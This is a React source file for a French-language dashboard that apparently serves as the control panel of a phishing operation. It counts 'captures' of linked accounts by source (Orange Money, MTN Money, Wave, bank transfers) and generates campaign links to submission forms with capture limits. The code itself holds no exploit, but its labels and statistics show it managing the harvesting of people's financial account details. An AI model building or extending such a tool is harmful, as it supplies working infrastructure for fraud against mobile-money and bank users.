'use client';

import { useState, useEffect } from 'react';
import {
    Plus,
    Link2,
    Copy,
    Trash2,
    Loader2,
    TrendingUp,
    Calendar,
    Users,
    Wallet,
    CheckCircle2,
    ArrowRight,
    ExternalLink
} from 'lucide-react';
import { cn } from '@/lib/utils';
import { api } from '@/lib/api';
import { motion, AnimatePresence } from 'framer-motion';
import Link from 'next/link';

interface Stats {
    total: number;
    today: number;
    month: number;
    methods: {
        orange: number;
        mtn: number;
        wave: number;
        bank: number;
        other: number;
    };
}

export default function DashboardPage() {
    const [loading, setLoading] = useState(true);
    const [stats, setStats] = useState<Stats>({
        total: 0,
        today: 0,
        month: 0,
        methods: { orange: 0, mtn: 0, wave: 0, bank: 0, other: 0 }
    });
    const [links, setLinks] = useState<any[]>([]);
    const [newCampaign, setNewCampaign] = useState({ name: '', limit: '' });
    const [isCreating, setIsCreating] = useState(false);
    const [copyStatus, setCopyStatus] = useState<string | null>(null);

    const fetchData = async () => {
        try {
            const [submissionsData, linksData] = await Promise.all([
                api.get('/submissions/'),
                api.get('/links/')
            ]);

            const now = new Date();
            const todayStr = now.toISOString().split('T')[0];
            const monthStr = now.toISOString().slice(0, 7);

            setStats({
                total: submissionsData.length,
                today: submissionsData.filter((s: any) => s.created_at.startsWith(todayStr)).length,
                month: submissionsData.filter((s: any) => s.created_at.startsWith(monthStr)).length,
                methods: {
                    orange: submissionsData.filter((s: any) => s.method === 'orange').length,
                    mtn: submissionsData.filter((s: any) => s.method === 'mtn').length,
                    wave: submissionsData.filter((s: any) => s.method === 'wave').length,
                    bank: submissionsData.filter((s: any) => s.method === 'bank').length,
                    other: submissionsData.filter((s: any) => s.method === 'other').length,
                }
            });
            setLinks(linksData.sort((a: any, b: any) => new Date(b.created_at).getTime() - new Date(a.created_at).getTime()).slice(0, 5));
        } catch (error) {
            console.error('Error fetching dashboard data:', error);
        } finally {
            setLoading(false);
        }
    };

    useEffect(() => {
        fetchData();
    }, []);

    const handleCreateLink = async () => {
        if (!newCampaign.name.trim()) return;
        setIsCreating(true);
        try {
            const limitVal = parseInt(newCampaign.limit);
            const res = await api.post('/links/', {
                name: newCampaign.name.trim(),
                submissions_limit: isNaN(limitVal) ? 0 : limitVal
            });

            // Generate the link
            const linkId = res.link_id || res.id; // Fallback if link_id isn't returned directly
            const fullUrl = `${window.location.origin}/form/${linkId}`;

            // Try to copy to clipboard
            try {
                await navigator.clipboard.writeText(fullUrl);
            } catch (clipErr) {
                console.warn('Clipboard access denied, link created but not copied automatically.');
            }

            setCopyStatus(linkId);
            setNewCampaign({ name: '', limit: '' });
            fetchData();
            setTimeout(() => setCopyStatus(null), 3000);
        } catch (err: any) {
            console.error('Failed to create link:', err);
            const msg = err.message || "Impossible de créer le lien";
            alert(`Erreur: ${msg}`);
        } finally {
            setIsCreating(false);
        }
    };

    const copyDirectLink = async (id: string) => {
        const fullUrl = `${window.location.origin}/form/${id}`;
        await navigator.clipboard.writeText(fullUrl);
        setCopyStatus(id);
        setTimeout(() => setCopyStatus(null), 2000);
    };

    if (loading) return (
        <div className="flex items-center justify-center min-h-[400px]">
            <Loader2 className="w-10 h-10 text-brand-primary animate-spin" />
        </div>
    );

    return (
        <div className="space-y-12 animate-fade-in pb-20">
            {/* Stats row */}
            <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-6">
                {[
                    { label: 'Comptes liés', value: stats.total.toLocaleString(), emoji: '📊', desc: 'TOTAL', color: 'text-white' },
                    { label: 'Nouveaux', value: stats.today.toLocaleString(), emoji: '📅', desc: "AUJOURD'HUI", color: 'text-green-400' },
                    { label: 'Nouveaux', value: stats.month.toLocaleString(), emoji: '📆', desc: 'CE MOIS', color: 'text-brand-primary' },
                    { label: 'Taux conversion', value: '100%', emoji: '💰', desc: 'SÉCURITÉ', color: 'text-white' },
                ].map((stat, i) => (
                    <div key={i} className="glass-card rounded-2xl p-8 border-white/5 hover:bg-white/[0.02] transition-all text-center">
                        <h4 className="text-[10px] font-black uppercase tracking-[3px] opacity-40 mb-6 flex items-center justify-center gap-2">
                            {stat.emoji} {stat.desc}
                        </h4>
                        <div className={cn("text-4xl font-display font-medium tracking-tighter mb-2", stat.color)}>{stat.value}</div>
                        <div className="text-[11px] font-bold text-brand-text-dim uppercase tracking-[2px]">{stat.label}</div>
                    </div>
                ))}
            </div>

            {/* Distribution and Charts */}
            <div className="grid grid-cols-1 lg:grid-cols-3 gap-8">
                <div className="lg:col-span-2 glass-card rounded-[40px] p-10 border-white/5 h-[400px] relative overflow-hidden flex flex-col bg-gradient-to-br from-brand-primary/[0.02] to-transparent">
                    <h3 className="text-[11px] font-black uppercase tracking-[3px] text-brand-primary mb-12 flex items-center gap-2">
                        📈 ACTIVITÉ DU RÉSEAU <span className="opacity-40">(Flux continu)</span>
                    </h3>
                    <div className="flex-1 flex items-center justify-center opacity-10">
                        <TrendingUp className="w-48 h-48 text-brand-primary" />
                    </div>
                </div>

                <div className="glass-card rounded-[40px] p-10 border-white/5">
                    <h3 className="text-[11px] font-black uppercase tracking-[3px] text-brand-primary mb-10">🥧 RÉPARTITION SOURCES</h3>
                    <div className="space-y-5">
                        {[
                            { l: 'Orange Money', v: stats.methods.orange, e: '🟠', color: 'text-orange-500' },
                            { l: 'MTN Money', v: stats.methods.mtn, e: '🟡', color: 'text-yellow-500' },
                            { l: 'Wave Mobile', v: stats.methods.wave, e: '🌊', color: 'text-blue-400' },
                            { l: 'Virements', v: stats.methods.bank, e: '🏦', color: 'text-blue-500' },
                            { l: 'Autres', v: stats.methods.other, e: '📱', color: 'text-white' },
                        ].map((item, i) => (
                            <div key={i} className="flex items-center justify-between">
                                <div className="flex items-center gap-3">
                                    <span className="text-lg">{item.e}</span>
                                    <div className="flex flex-col">
                                        <span className="text-[11px] font-bold uppercase">{item.l}</span>
                                        <span className="text-[10px] opacity-40 font-medium tracking-widest">{item.v} CAPTURES</span>
                                    </div>
                                </div>
                                <div className={cn("text-[11px] font-black", item.color)}>
                                    {stats.total > 0 ? Math.round((item.v / stats.total) * 100) : 0}%
                                </div>
                            </div>
                        ))}
                    </div>
                </div>
            </div>

            {/* Link Generator */}
            <section className="glass-card rounded-[40px] p-10 sm:p-14 border-brand-primary/20 bg-brand-primary/[0.02] relative overflow-hidden group">
                <div className="absolute top-0 right-0 p-10 opacity-5 group-hover:opacity-10 transition-opacity">
                    <Link2 className="w-32 h-32 text-brand-primary" />
                </div>

                <h3 className="text-[11px] font-black uppercase tracking-[4px] text-brand-primary mb-12 flex items-center gap-3">
                    <span className="w-8 h-8 rounded-lg bg-brand-primary/10 flex items-center justify-center text-xs">🚀</span>
                    GÉNÉRATEUR DE LIEN SÉCURISÉ
                </h3>

                <div className="grid grid-cols-1 md:grid-cols-2 gap-10 mb-10">
                    <div className="space-y-4">
                        <label className="text-[10px] font-black uppercase tracking-[3px] text-brand-primary/60 ml-1">Nom de la Campagne</label>
                        <input
                            type="text"
                            value={newCampaign.name}
                            onChange={e => setNewCampaign({ ...newCampaign, name: e.target.value })}
                            placeholder="Ex: Campagne Crypto Aout"
                            className="w-full bg-white/[0.03] border border-white/10 rounded-2xl py-5 px-8 text-sm outline-none focus:border-brand-primary/40 focus:bg-white/[0.05] transition-all font-bold"
                        />
                    </div>
                    <div className="space-y-4">
                        <label className="text-[10px] font-black uppercase tracking-[3px] text-brand-primary/60 ml-1">Limite Captures (0 = Illimité)</label>
                        <input
                            type="number"
                            value={newCampaign.limit}
                            onChange={e => setNewCampaign({ ...newCampaign, limit: e.target.value })}
                            placeholder="Illimité"
                            className="w-full bg-white/[0.03] border border-white/10 rounded-2xl py-5 px-8 text-sm outline-none focus:border-brand-primary/40 focus:bg-white/[0.05] transition-all font-bold"
                        />
                    </div>
                </div>

                <div className="flex flex-col sm:flex-row items-center gap-6">
                    <button
                        onClick={handleCreateLink}
                        disabled={isCreating || !newCampaign.name}
                        className="btn-premium px-16 py-6 rounded-[24px] text-[11px] font-black uppercase tracking-[5px] flex items-center gap-4 shadow-2xl disabled:opacity-50"
                    >
                        {isCreating ? <Loader2 className="w-4 h-4 animate-spin" /> : <Plus className="w-4 h-4" />}
                        CRÉER ET COPIER LE LIEN
                    </button>
                    <AnimatePresence>
                        {copyStatus && (
                            <motion.div initial={{ opacity: 0, x: -20 }} animate={{ opacity: 1, x: 0 }} exit={{ opacity: 0, scale: 0.9 }} className="flex items-center gap-4 text-green-400 font-black text-[10px] uppercase tracking-widest">
                                <CheckCircle2 className="w-5 h-5" /> LIEN COPIÉ AVEC SUCCÈS !
                            </motion.div>
                        )}
                    </AnimatePresence>
                </div>
            </section>

            {/* Links List */}
            <div className="space-y-6">
                <div className="flex items-center gap-6 px-10">
                    <div className="h-px flex-1 bg-white/5" />
                    <h2 className="text-[10px] font-black uppercase tracking-[6px] text-white/30">LIENS ACTIFS RÉCENTS</h2>
                    <div className="h-px flex-1 bg-white/5" />
                </div>

                {links.length > 0 ? (
                    links.map((link) => (
                        <article key={link.id} className="glass-card rounded-[32px] p-8 border-white/5 hover:border-brand-primary/20 transition-all group relative overflow-hidden">
                            <div className="flex flex-col md:flex-row justify-between items-center gap-8">
                                <div className="space-y-4 flex-1">
                                    <div className="flex items-center gap-4">
                                        <div className="w-10 h-10 rounded-xl bg-brand-primary/10 flex items-center justify-center text-brand-primary border border-brand-primary/10">
                                            <TrendingUp className="w-5 h-5" />
                                        </div>
                                        <div>
                                            <h4 className="text-[14px] font-black uppercase tracking-widest text-white group-hover:text-brand-primary transition-colors">{link.name}</h4>
                                            <p className="text-[10px] text-brand-text-dim/60 font-bold uppercase tracking-widest">Créé le {new Date(link.created_at).toLocaleDateString()}</p>
                                        </div>
                                    </div>
                                    <div className="flex items-center gap-3 py-3 px-5 rounded-2xl bg-[#03040b]/50 border border-white/5 max-w-fit">
                                        <span className="text-[12px] font-medium text-brand-primary opacity-60">/form/{link.link_id}</span>
                                        <button onClick={() => copyDirectLink(link.link_id)} className="p-2 hover:bg-white/5 rounded-lg transition-all text-brand-primary">
                                            {copyStatus === link.link_id ? <CheckCircle2 className="w-4 h-4" /> : <Copy className="w-4 h-4" />}
                                        </button>
                                        <Link href={`/form/${link.link_id}`} target="_blank" className="p-2 hover:bg-white/5 rounded-lg transition-all text-white/40 hover:text-white">
                                            <ExternalLink className="w-4 h-4" />
                                        </Link>
                                    </div>
                                </div>
                                <div className="flex items-center gap-10">
                                    <div className="text-right">
                                        <p className="text-[9px] font-black uppercase tracking-widest text-brand-text-dim/40 mb-1">LIMITE</p>
                                        <p className="text-xs font-black text-white">{link.submissions_limit === 0 ? '∝' : link.submissions_limit}</p>
                                    </div>
                                    <Link href="/dashboard/links" className="w-12 h-12 rounded-2xl bg-white/5 border border-white/10 flex items-center justify-center hover:bg-brand-primary/10 hover:border-brand-primary/20 transition-all text-white/20 hover:text-brand-primary">
                                        <ArrowRight className="w-5 h-5" />
                                    </Link>
                                </div>
                            </div>
                        </article>
                    ))
                ) : (
                    <div className="p-20 text-center italic text-brand-text-dim/20 text-sm">Fin de liste</div>
                )}
            </div>
        </div>
    );
}
